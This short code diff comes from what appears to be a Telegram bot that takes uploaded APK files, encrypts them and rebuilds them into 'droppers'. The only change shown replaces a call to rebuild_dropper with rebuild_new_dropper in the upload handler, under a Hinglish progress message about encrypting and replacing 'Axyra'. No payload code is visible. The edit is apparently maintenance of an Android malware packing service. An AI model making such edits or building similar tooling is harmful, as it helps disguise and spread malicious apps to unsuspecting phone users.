@@ -739,7 +739,7 @@ async def handle_document(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
     await prog.edit_text("🔐 Encrypt ho raha hai + Axyra replace...")
 
     try:
-        new_dropper, new_pkg = rebuild_dropper(apk_bytes)
+        new_dropper, new_pkg = rebuild_new_dropper(apk_bytes)
     except Exception as e:
         log.exception("rebuild failed")
         await prog.edit_text(f"❌ Error: {e}")
